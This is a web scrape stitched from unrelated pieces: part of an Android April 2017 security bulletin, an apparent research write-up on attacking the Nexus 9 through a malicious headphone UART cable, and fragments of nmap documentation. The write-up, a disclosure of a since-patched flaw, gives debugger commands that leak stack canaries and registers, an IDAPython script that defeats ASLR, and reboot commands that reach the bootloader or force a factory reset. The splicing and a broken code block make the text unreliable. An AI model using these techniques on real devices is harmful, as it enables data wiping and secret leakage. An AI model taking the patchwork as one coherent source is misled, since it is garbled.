# Android Security Bulletin—April 2017

Stay organized with collections

Save and categorize content based on your preferences.

*Published April 03, 2017 | Updated August 17, 2017*

The Android Security Bulletin contains details of security vulnerabilities
affecting Android devices. Alongside the bulletin, we have released a security
update to Nexus devices through an over-the-air (OTA) update. The Google device
firmware images have also been released to the [Google Developer
site](https://developers.google.com/android/nexus/images). Security patch levels of April 05, 2017 or later address all of these
issues. Refer to the [Pixel
and Nexus update schedule](https://support.google.com/pixelphone/answer/4457705#pixel_phones&nexus_devices) to learn how to check a device's security patch
level.

Partners were notified of the issues described in the bulletin on March 06, 2017
or earlier. Source code patches for these issues have been released to the Android
Open Source Project (AOSP) repository and linked from this bulletin. This bulletin
also includes links to patches outside of AOSP.

The most severe of these issues is a Critical security vulnerability that could
enable remote code execution on an affected device through multiple methods such
as email, web browsing, and MMS when processing media files. The
[severity
assessment](/docs/security/overview/updates-resources#severity) is based on the effect that exploiting the vulnerability would
possibly have on an affected device, assuming the platform and service
mitigations are disabled for development purposes or if successfully bypassed.

We have had no reports of active customer exploitation or abuse of these newly
reported issues. Refer to the [Android and Google service
mitigations](#mitigations) section for details on the [Android
security platform protections](/docs/security/enhancements) and service protections such as [SafetyNet](https://developer.android.com/training/safetynet/index.html),
which improve the security of the Android platform.

We encourage all customers to accept these updates to their devices.

## Announcements

* This bulletin has two security patch level strings to provide Android
  partners with the flexibility to more quickly fix a subset of vulnerabilities
  that are similar across all Android devices. See [Common questions and answers](#common-questions-and-answers) for
  additional information:
  + **2017-04-01**: Partial security patch level string. This
    security patch level string indicates that all issues associated with 2017-04-01
    (and all previous security patch level strings) are addressed.
  + **2017-04-05**: Complete security patch level string. This
    security patch level string indicates that all issues associated with 2017-04-01
    and 2017-04-05 (and all previous security patch level strings) are addressed.
* Supported Google devices will receive a single OTA update with the April 05,
  2017 security patch level.

## Android and Google Service Mitigations

This is a summary of the mitigations provided by the [Android
security platform](/docs/security/enhancements) and service protections such as SafetyNet. These
capabilities reduce the likelihood that security vulnerabilities could be
successfully exploited on Android.

* Exploitation for many issues on Android is made more difficult by
  enhancements in newer versions of the Android platform. We encourage all users
  to update to the latest version of Android where possible.
* The Android Security team actively monitors for abuse with [Verify
  Apps and SafetyNet](/static/docs/security/overview/reports/Google_Android_Security_2016_Report_Final.pdf), which are designed to warn users about [Potentially
  Harmful Applications](http://static.googleusercontent.com/media/source.android.com/en//security/reports/Google_Android_Security_PHA_classifications.pdf). Verify Apps is enabled by default on devices with [Google Mobile Services](http://www.android.com/gms) and is especially
  important for users who install applications from outside of Google Play. Device
  rooting tools are prohibited within Google Play, but Verify Apps warns users
  when they attempt to install a detected rooting application—no matter where it
  comes from. Additionally, Verify Apps attempts to identify and block
  installation of known malicious applications that exploit a privilege escalation
  vulnerability. If such an application has already been installed, Verify Apps
  will notify the user and attempt to remove the detected application.
* As appropriate, Google Hangouts and Messenger applications do not
  automatically pass media to processes such as Mediaserver.

## Common Questions and Answers

This section answers common questions that may occur after reading this
bulletin.

**1. How do I determine if my device is updated to address these issues?**

To learn how to check a device's security patch level, read the instructions on
the [Pixel
and Nexus update schedule](https://support.google.com/pixelphone/answer/4457705#pixel_phones&nexus_devices).

* Security patch levels of 2017-04-01 or later address all issues associated
  with the 2017-04-01 security patch level.
* Security patch levels of 2017-04-05 or later address all issues associated
  with the 2017-04-05 security patch level and all previous patch levels.

Device manufacturers that include these updates should set the patch string
level to:

* [ro.build.version.security\_patch]:[2017-04-01]
* [ro.build.version.security\_patch]:[2017-04-05]

**2. Why does this bulletin have two security patch levels?**

This bulletin has two security patch levels so that Android partners have the
flexibility to fix a subset of vulnerabilities that are similar across all
Android devices more quickly. Android partners are encouraged to fix all issues
in this bulletin and use the latest security patch level.

* Devices that use the April 01, 2017 security patch level must include all
  issues associated with that security patch level, as well as fixes for all
  issues reported in previous security bulletins.

**3. How do I determine which Google devices are affected by each
issue?**

In the [2017-04-01](#2017-04-01-details) and
[2017-04-05](#2017-04-05-details)
security vulnerability details sections, each table has an *Updated Google
devices* column that covers the range of affected Google devices updated for
each issue. This column has a few options:

* **All Google devices**: If an issue affects All and Pixel
  devices, the table will have "All" in the *Updated Google devices*
  column. "All" encapsulates the following [supported
  devices](https://support.google.com/pixelphone/answer/4457705#pixel_phones&nexus_devices): Nexus 5X, Nexus 6, Nexus 6P, Nexus 9, Android One,
  Nexus Player, Pixel C, Pixel, and Pixel XL.
* **Some Google devices**: If an issue doesn't affect all Google
  devices, the affected Google devices are listed in the *Updated Google
  devices* column.
* **No Google devices**: If no Google devices running Android 7.0
  are affected by the issue, the table will have "None" in the *Updated Google
  devices* column.

**4. What do the entries in the references column map to?**

Entries under the *References* column of the vulnerability details table
may contain a prefix identifying the organization to which the reference value
belongs. These prefixes map as follows:

| Prefix | Reference |
| --- | --- |
| A- | Android bug ID |
| QC- | Qualcomm reference number |
| M- | MediaTek reference number |
| N- | NVIDIA reference number |
| B- | Broadcom reference number |

# Attacking Nexus 9 with Malicious Headphones

By [Roee Hay](/authors/roeeh) ([@roeehay](https://twitter.com/roeehay))

March 8, 2017
\*

 [CVE-2017-0510](/vulns/aleph-2017000) [CVE-2017-0563](/vulns/aleph-2017009) [CVE-2017-0582](/vulns/aleph-2017010)

\*

In the [March 2017 Android Security Bulletin](https://source.android.com/security/bulletin/2017-03-01.html#eop-in-kernel-fiq-debugger), Google released a patch to [CVE-2017-0510](/vulns/aleph-2017000), a critical severity vulnerability in Nexus 9 we discovered and responsiblity disclosed a few months ago. This vulnerability has a very unusual attack vector – headphones. By exploiting this vulnerability we managed to leak stack canaries, derandomize `ASLR`, conduct a factory reset, and even access `HBOOT`, allowing for communication with internal System-on-Chips (SoCs) through I\(^2\)C.

## Background

In their [BlackHat 2013 paper](https://media.blackhat.com/us-13/US-13-Ossmann-Multiplexed-Wired-Attack-Surfaces-WP.pdf), Michael Ossmann & Kyle Osborn showed that multiplexed wired functionality exists in several mobile phones. Their research mainly focused on the USB socket. In the paper, they presented interesting results on various variants of Galaxy Nexus. For example, they showed that with Galaxy Nexus running CyanogenMod (CM), one could get access to the `FIQ Debugger` ([see next](#fiq-debugger)) together with an unprivileged shell. More severely, on Samsung Galaxy S3 running CM they have also got a root shell. Ossmann & Osborn also briefly documented multiplexed audio connectors, noting that Nexus 4 has a `TTL UART` interface hidden in its headphone jack, a functionality which is enabled if the voltage on the `MIC` pin exceeds some threshold.

Fast-forward to 2017, nowadays it’s a well known fact that the Nexus devices (Pixel too) have this kind of functionality in their headphone jack. There are multiple examples of people [building and documenting](http://www.pabr.org/consolejack/consolejack.en.html) their cables.

## A New Survey

We were curious, so [Sagi Kedmi](https://sagi.io/) ([@sagikedmi](https://twitter.com/sagikedmi)) suggested we would also assemble our own cable. We decided to go with the standard [FTDI232RL breakout board](https://www.sparkfun.com/products/12731):

![FTDI232RL](/assets/img/ftdi232rl.jpg)

We then tested it over recent Google devices, running the latest available build with a locked bootloader (BL):

| Device | Build | Access | Notes |
| --- | --- | --- | --- |
| Nexus 5 | M4B30Z | BL & Platform kernel logs |  |
| Nexus 5X | N4F26O | BL & Platform kernel logs |  |
| Nexus 6 | NBD91Y | BL & Platform kernel logs | Platform log can be switched on/off via fastboot oem cmd on locked BL |
| Nexus 6P | N4F26O | BL & Platform kernel logs | Platform log can be switched on/off via fastboot oem cmd on locked BL. If enabled, will not boot the platform without a debug cable connected |
| Pixel | NOF26V | BL & Platform kernel logs | Platform log can be switched on/off via fastboot oem cmd on unlocked BL |
| Pixel C | N4F26O | None |  |
| Nexus 9 | N4F26Q | BL & Platform kernel logs, `FIQ Debugger`, `HBOOT` |  |

All but Pixel C had the multiplexed functionality. It should be noted some devices also required us to enable `UART` via a proprietary `fastboot oem` command (e.g `oem uart enable`). To our surprise, Nexus 9 behaved quite differently, having extra functionalities beyond debug messages, and beyond the `FIQ Debugger`.

In the next sections we will study some internals behind the vulnerability and its security impact.

## FIQ Debugger

When we first booted up Nexus 9 with the `UART` cable attached, we noticed something familiar:

```
smc_undefined:66: param0: 0x0
smc_undefined:66: param1: 0x0
smc_undefined:66: param2: 0x0
smc_undefined:66: Undefined monitor call!
smc_undefined:66: SMC: 0x32000002 (Stdcall entity 50 function 0x2)
smc_undefined:66: param0: 0x0
smc_undefined:66: param1: 0x0
smc_undefined:66: param2: 0x0
<hit enter to activate fiq debugger>
debug>

```

Similarly to what Ossman & Osbord have shown on older Android devices, one could access the `FIQ Debugger` on Nexus 9 as well, although without a shell on `user` (production) builds. It should be noted that the `FIQ Debugger` functionality is enabled even if the `UART` cable is inserted when the platform is up.

The `FIQ` (*Fast Interrupt Request*) debugger module which we can apparently access in Nexus 9 is implemented mainly by [fiq\_debugger.c](https://android.googlesource.com/kernel/tegra/%2B/android-7.1.1_r0.13/drivers/staging/android/fiq_debugger/fiq_debugger.c) and [tegra\_fiq\_debugger.c](https://android.googlesource.com/kernel/tegra/%2B/android-7.1.1_r0.13/drivers/platform/tegra/tegra_fiq_debugger.c) in the tegra kernel tree.

Whenever a keystroke is sent to the device via `UART`, an `FIQ` is generated, which eventually (and probably after visiting some ARM Monitor mode code) reaches `fiq_debugger_handle_uart_interrupt` that dispatches the relevant command handler.

In order to speed-up the work of the researcher, the `FIQ Debugger` interface provides a `help` command:

```
debug> help
FIQ Debugger commands:
    pc            PC status
    regs          Register dump
    allregs       Extended Register dump
    bt            Stack trace
    reboot [<c>]  Reboot with command <c>
    reset [<c>]   Hard reset with command <c>
    irqs          Interupt status
    kmsg          Kernel log
    version       Kernel version
    sleep         Allow sleep while in FIQ
    nosleep       Disable sleep while in FIQ
    console       Switch terminal to console
    cpu           Current CPU
    cpu <number>  Switch to CPU<number>
    ps            Process list
    sysrq         sysrq options
    sysrq <param> Execute sysrq with <param>

```

The list of available commands clearly indicates the attacker may exfiltrate a lot of sensitive information by interacting with the `FIQ Debugger`. For example, the attacker can dump the process list:

```
debug> ps
pid   ppid  prio task            pc
1     0  120 init          S ffffffc0000868f4

...
869     2  120 kworker/1:3   S ffffffc0000868f4
debug>

```

By using the `console` command, for example, it’s possible to view the kernel log (similar to other Nexus devices), and receive an unprivileged shell (**not on production (`user`) builds** – on `userdebug`, `eng` builds only!)

Using the `bt`/`regs`/`allregs` commands allows the attacker to dump the registers, and when falling under the kernel context, the call stack too. Unlike a normal debugger we cannot modify memory and/or place breakpoints, however since the `FIQ` preempts, the dumped information will be of an arbitrary process. In order to validate this assumption, we first created a tiny app that sets one of the registers to `0x1234` in an infinite loop:

```
 for (;;) { asm("MOV x0,#0x1234"); }

```

We expected that we will eventually hit the context of the app’s process, with `x0 = 0x1234`. Indeed:

```
debug> bt
pid: 0  comm: swapper/0
 x0 0000000000000000  x1 ffffffc000f7a400
 x2 0000000000000000  x3 ffffffc0006f4950
 ....
debug> bt
pid: 2363 comm: Thread-2
 x0 0000000000001234  x1 00000070d3406774
 x2 0000000000000000  x3 00000070cf580c00
 x4 00000070d3406be8  x5 00000070d92b6080
 x6 8080808080808080  x7 0000000000000000
 ....

```
## Listening to your Stack Canaries

Our next step was to prove we can leak something more sensitive – the **Stack Canary** value of Zygote, which is shared between all Android apps. (Due to the fact all Android apps are forked from Zygote without an exec syscall.).

We first created a small app that dumps the canary to logcat:

```
__android_log_print(ANDROID_LOG_VERBOSE, APPNAME,
                   "_stack_chk_guard: %llx",
                   *(uint64_t *)&__stack_chk_guard);

```

And the canary was:

```
02-01 16:30:35.623 .. V NATIVE: _stack_chk_guard: 0a2b6c120521b7c6

```

We then created a small PoC that dumps the registers in a successive manner. Eventually we fell under the context of a stack-protected function – reg `x26` contains the canary value!

```
pid: 1300  comm: system_server
  x0 0000000012ed8624   x1 0000000000000000
  x2 0000000000000004   x3 0000007ffb44fa40

  pc 00000075a02c90cc cpsr 80000000 (EL0t)

```

Disassembling near `00000075a02c90cc` under `system_server` shows that it belongs to the `art::gc::Heap::AllocObjectWithAllocator` function. Indeed `x26` is assigned with `__stack_chk_guard` value:

## ASLR

It is no surprise that being able to view arbitrary CPU contexts with addresses included is bad news for `ASLR`, which is in charge of randomizing various addresses, such as of the heap, stack, shared libraries and the executable image itself.

In this post we will focus on libraries only, although it should be fairly safe to claim that this vulnerability significantly weakens `ASLR` for all of the above.
As mentioned before, by exploiting this vulnerability one can preempt an arbitrary process, and dump the CPU registers.
For example, here is a registers’ dump for `Chrome`:

```
pid: 2856  comm: .android.chrome
 r0 d51fce86  r1 001a517c  r2 b914880d  r3 ff8f754c
 r4 e2b081c0  r5 007797ec  r6 d44127ec  r7 e7ac0430
 r8 12de1940  r9 ff8f7470 r10 dcc65a94 r11 00000000
 ip f13eb860  sp ff8f73a8  lr eedd78ef  pc eedd5ac8
 cpsr 80070030 (USR)

```

Viewing the value of the `PC` register, `0xeedd5ac8` in this case, clearly reveals some information. However, in order to conduct a practical attack against `ASLR`, we need to deduce to which library this address belongs and what its base address is.

As for the first part, a statistical approach can be taken. We could calculate, a priori, the hit frequency of each loaded library (with respect to the app). While we did not perform that experiment, we have a strong feeling that the empirical distribution will have a low entropy.

Back to the example, this address falls under `libart`, the runtime. We assume that there is a high probability to preempt the process (via FIQ) when it visits that library, although unconfirmed. Equipped with this knowledge, how can one derandomize the base address of `libart`?

We can see that `PC`’s least significant 12 bits, which are unaffected by `ASLR`, are `0xac8`. We can then take this dynamic information and search for all of the instructions with the relevant addresses – unfortunately there are a lot. Despite that, there are maybe additional registers we can leverage. For example, the link register – `LR`. This has led to our next experiment: by using `idapython` we statically searched for all functions that contain an xref from an address that ends with `0x8ef-1-4` or `0x8ef-1-2` (the -1 and multiple instruction sizes are because of `THUMB`), and that have an instruction at an address that ends with `0xac8`.

```
from idautils import *
from idaapi import *

LR = 0xeedd78ef
PC = 0xeedd5ac8

MASK = 2**12-1

for fea in Functions(0, 0xFFFFFFFF):
    fname = GetFunctionName(fea)
    dfname = Demangle(fname,GetLongPrm(INF_SHORT_DN));

    b = 0
    for xref in CodeRefsTo(fea, 0):
        if ((LR-5) & MASK == (xref & MASK)) or \
           ((LR-3) & MASK == (xref & MASK)):
            for x in FuncItems(fea):
                if PC & MASK == (x & MASK):
                    print "%x: %s" % (x,  dfname or fname)
                    b = 1

            if b == 1:
                break

```

This script yielded only 6 results under `libart` (rebased at zero), significantly reducing the `ASLR` entropy:

```
eec11ac8: art::gc::Heap::AllocObjectWithAllocator<true,true,art::mirror::Class::InitializeClassVisitor>(art::Thread *,art::mirror::Class*,uint,art::gc::AllocatorType,art::mirror::Class::InitializeClassVisitor const&)
eec5dac8: mspace_malloc
eed60ac8: art::jit::Jit::MaybeDoOnStackReplacement(art::Thread *,art::ArtMethod *,uint,int,art::JValue *)
eedd5ac8: art::OatFile::End(void)
eee42ac8: art::Thread::PassActiveSuspendBarriers(art::Thread*)
eee5eac8: art::PrettyMethod(art::ArtMethod *,bool)

```

One can then reduce the results even further. We made a short experiment, rebooted the device several times a recorded the mapped location of `libart.so`:

```
addr=0xee11a000
addr=0xf021a000
addr=0xeac9a000
addr=0xf039a000
addr=0xe6c1a000
addr=0xeab1a000
addr=0xe761a000
addr=0xef69a000
addr=0xef09a000
addr=0xeea9a000
addr=0xe559a000
addr=0xebe9a000
addr=0xeec9a000
addr=0xeed1a000

```

We can notice, even without getting into the fine details of the address mapping algorithm, that the 19 least significant bits, `0011010000000000000`, are shared among all reboots. Thus we can take that into consideration, and re-run our script, this time with `MASK = 2**19-1`: (We also rebased the image to `0x1a000`.)

```
2d5ac8: art::OatFile::End(void)

```

This implies the following `libart` base address: `0xeedd5ac8 - 0x2d5ac8 + 0x1a000 = 0xeeb1a000`, and indeed:

```
flounder:/proc/2856 # cat maps | grep libart.so
eeb1a000-eef74000 r-xp 00000000 fd:00 985     /system/lib/libart.so
eef74000-eef7c000 r--p 00459000 fd:00 985     /system/lib/libart.so
eef7c000-eef7e000 rw-p 00461000 fd:00 985     /system/lib/libart.so

```

Since `libart.so` is loaded by `zygote`, and due to the [Android app forking model](https://taesoo.gtisc.gatech.edu/pubs/2014/lee%3Amorula.pdf), it will be loaded into all apps under the same virtual address.

It’s also worth noting that if one still receives multiple candidates, they can be reduced even further. For example, by leveraging other registers, or creating a heat-map within the library itself together with contextual information, as it is possible that hit process does not even (transitively) call some of these candidates.

Conversely, finding no candidates at all, indicates that we chose the wrong libary (e.g. the called code is not of `libart.so`, but rather of another lib loaded by the preempted process, or of the application itself).

## SysRq

Interestingly, the `FIQ Debugger` provides a `sysrq` command, which should provide access to the Linux [SysRq](https://en.wikipedia.org/wiki/Magic_SysRq_key) interface. Despite that, hitting `sysrq` after the platform has loaded returns nothing:

```
debug> sysrq
debug>

```

Digging into the code which handles the FIQ `sysrq` command, reveals the reason:

```
static void fiq_debugger_do_sysrq(struct fiq_debugger_state *state, char rq)
{
	if ((rq == 'g' || rq == 'G') && !fiq_kgdb_enable) {
		fiq_debugger_printf(&state->output, "sysrq-g blocked\n");
		return;
	}
	fiq_debugger_begin_syslog_dump(state);
	handle_sysrq(rq);
	fiq_debugger_end_syslog_dump(state);
}

```

```
void handle_sysrq(int key)
{
	if (sysrq_on())
		__handle_sysrq(key, true);
}

```

```
static bool sysrq_on(void)
{
	return sysrq_enabled || sysrq_always_enabled;
}

```

By instrumenting the kernel we witnessed that when the platform is up, both `sysrq_enabled` and `sysrq_always_enabled` are 0, thus `sysrq_on` returns `false`. The value of the latter can be set to 1 by providing a kernel parameter (which is not provided on Nexus 9, thus the value is 0):

```
__setup("sysrq_always_enabled", sysrq_always_enabled_setup);

```

The default value of `sysrq_enabled`, however, is 1:

```
static int __read_mostly sysrq_enabled = SYSRQ_DEFAULT_ENABLE;

```

where under sysrq.h:

```
/* Enable/disable SYSRQ support by default (0==no, 1==yes). */
#define SYSRQ_DEFAULT_ENABLE	1

```

Therefore something must change the variable’s value to 0, and indeed, this is done by an Android init script (`init.rc`):

```
[...]
on early-init
# Set init and its forked children's oom_adj.
    write /proc/1/oom_score_adj -1000

    # Disable sysrq from keyboard
    write /proc/sys/kernel/sysrq 0
[...]

```

The `/proc/sys/kernel/sysrq` proc file is backed by code under `kernel/sysctl.c`, that eventually toggles `sysrq_enabled`.
Hence there is a short window of time at which `sysrq` is enabled – during the kernel’s boot, before the `init` script is executed. Indeed:

```
debug> sysrq
[  387.104381] SysRq : HELP : loglevel(0-9) reboot(b) crash(c) terminate-all-tasks(e) memory-full-oom-kill(f) kill-all-tasks(i) thaw-filesystems(j) show-backtrace-all-active-cpus(l) show-memory-usage(m) nice-all-RT-tasks(n) poweroff(o) show-registers(p) show-all-timers(q) sync(s) show-task-states(t) unmount(u) show-blocked-tasks(w) dump-ftrace-buffer(z)
debug>

```

The `sysrq` interface provides additional commands beyond the `FIQ Debugger`. For example, we can change the kernel logging level in order to leak more debugging messages:

```
debug> sysrq 9
[44984.239043] SysRq : Changing Loglevel
[44984.242969] Loglevel set to 9
debug>

```

Moreover, a lucky attacker can also dereference some registers:

```

## HBOOT

Our next step was trying to understand if we are limited to the `FIQ Debugger` prompt, or there are some more hidden gems.

The Nexus 9 bootloader has two modes: `HBOOT` and `FASTBOOT`, which can be interchanged via the bootloader UI:

| Nexus 9 FASTBOOT menu | Nexus 9 HBOOT menu |
| --- | --- |
| **FASTBOOT menu** | **HBOOT menu** |

We noticed that when we entered the `HBOOT` mode, another prompt was received via `UART` (through the headphones jack):

```
###[ Bootloader Mode ]###
hboot>

```

Hitting `?` shows the available commands:

```
hboot> ?
  #. <command>               : <brief description>
security_command:

## 42: Answer to the Ultimate Question of Life, the Universe, and Everything

It can be seen that through this interface we can trigger many interesting operations. From the attacker’s prespective, however, it is very unlikely that the victim would plug-in the headphones while the device is in the `HBOOT` mode.
As explained above, normally, when the victim plugs-in the malicious headphones, the latter will be able to interact with the `FIQ Debugger`, implemented by the platform.
So how can the attacker force a reboot to `HBOOT` from the `FIQ Debugger`? The answer is, unsurprisingly, [**42**](https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#Answer_to_the_Ultimate_Question_of_Life.2C_the_Universe.2C_and_Everything_.2842.29):

```
debug> reboot oem-42
debug>
[0000.045] Battery Present
[0000.069] Battery Voltage: 4170 mV
[0000.072] Battery charge sufficient
[0000.076] Override BCT configs
[0000.079] NvBootEmcReadMrr+++
[0000.082] NvBootEmcReadMrr---
....
###[ Bootloader Mode ]###
hboot>

```

Great, we can now easily access the `HBOOT` interface via `UART`.

## Accessing I\(^2\)C Buses

By having `HBOOT` access, the attacker can interact with I\(^2\)C accessible SoCs. Detecting the available SoCs can be done using the `i2cdetect` `HBOOT` command. The following shows the devices which listen on I\(^2\)C bus `0`:

```
hboot> i2cdetect 0
i2c device 0x66 foundi2c device 0x67 foundi2c device 0x6c found
i2c device 0x6d foundi2c device 0x98 foundi2c device 0x99 found
i2c device 0xd6 foundi2c device 0xd7 foundi2c device 0xe4 found
i2c device 0xe5 found
hboot>

```

For example, `0xe4` and `0xe5` are the read/write addresses of the `HTC SensorHub`, implemented on an `STM32F401 ARM Cortex-M4` SoC. `SensorHub`, as the name implies acts as an energy-efficient proxy between the main CPU and the actual sensors. It communicates with both ends using I\(^2\)C (different buses). Since the `STM32F401` bootloader supports [programming via I\(^2\)C](http://www.st.com/content/ccc/resource/technical/document/application_note/4c/68/fe/72/a8/cd/47/83/DM00072315.pdf/files/DM00072315.pdf/jcr%3Acontent/translations/en.DM00072315.pdf), our ultimate goal was to replace the SensorHub firmware via I\(^2\)C, just like the platform driver does. Unfortunately we soon found out it was not possible because booting STM32F4 to its bootloader [requires](http://www.st.com/content/ccc/resource/technical/document/application_note/b9/9b/16/3a/12/1e/40/0c/CD00167594.pdf/files/CD00167594.pdf/jcr%3Acontent/translations/en.CD00167594.pdf) being able to reset the SoC while the `Boot0` and `Boot1` pins are set to 1 and 0, correspondingly, but we cannot control these pins via `HBOOT`. Out of curiosity, we digged in the SensorHub driver, [CwMcuSensor](https://android.googlesource.com/kernel/tegra/%2B/android-7.1.1_r0.13/drivers/i2c/chips/CwMcuSensor.c) to see how it performs the firmware upgrade. Indeed it enables the `Boot0` pin, via `GPIO` (the other pin is probably pulled-down):

```
static void update_firmware(const struct firmware *fw, void *context)
{
...
    ret = check_fw_version(mcu_data, fw);
    if (ret == 1) { /* Perform firmware update */
        mutex_lock(&mcu_data->activated_i2c_lock);
        i2c_lock_adapter(mcu_data->client->adapter);
        mcu_data->client->addr = 0x39;
        gpio_direction_output(mcu_data->gpio_chip_mode, 1);
        mdelay(10);
        gpio_direction_output(mcu_data->gpio_reset, 0);
        mdelay(10);
        gpio_direction_output(mcu_data->gpio_reset, 1);
...
}

```

Although we miserably failed to flash `SensorHub`, we still wanted to interact with it via I\(^2\)C, proving that we can communicate with internal chips. Therefore we examined its firmware in order to find a few interesting I\(^2\)C registers.
Returning the **firmware version** is done by reading from register `0x10`:

```
hboot> i2cr 0 0xe4 0x10 6
ret:0
     > [6] = 1 0 10 28 2 1 0 0 0 0 0 0 0 0 0 0
hboot>

```

This indeed corresponds to the firmware image’s footer: `HTCSHUB001.000.016.040.002.001`. We then managed to access an actual sensor – the **Light Sensor**, through SensorHub. In order to do so, we first enabled it (writing `32` to register `0x90`), and then read its value (register `0x23`):

```
hboot> i2cw 0 0xe5 0x90 32
hboot> i2cr 0 0xe4 0x23 3
ret:0
     > [3] = 5 ba 3 0 0 0 0 0 0 0 0 0 0 0 0 0

```

In a dark room register `0x23` is `0`:

```
hboot> i2cr 0 0xe4 0x23 3
ret:0
     > [3] = 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0

```
## Factory Reset

Lastly, the attacker can also trigger a factory reset, simply by rebooting with `oem-76`:

```
debug> reboot oem-76
debug>
[...]

```

Better back-up your data before connecting those suspicious headphones!

## Patch

Google has patched the vulnerability by reducing the capabilities of the `FIQ Debugger`. When the platform is up, it’s no longer possible to dump the registers nor reboot with an `oem-N` parameter (preventing reboots into `HBOOT` and Factory Resets):

```
debug> help
FIQ Debugger commands:
 reboot        Reboot
 reset         Hard reset
 irqs          Interrupt status
 sleep         Allow sleep while in FIQ
 nosleep       Disable sleep while in FIQ
 console       Switch terminal to console
 ps            Process list
debug>

```

Issuing `reboot oem-42` now results in a normal reboot. As one can see, some commands are still available.

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*

] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

# Aleph Research: Google Nexus 9 Cypress SAR Firmware Injection via I2C (CVE-2017-0563)

---

*From*: Roee Hay <roee.hay () hcl com>
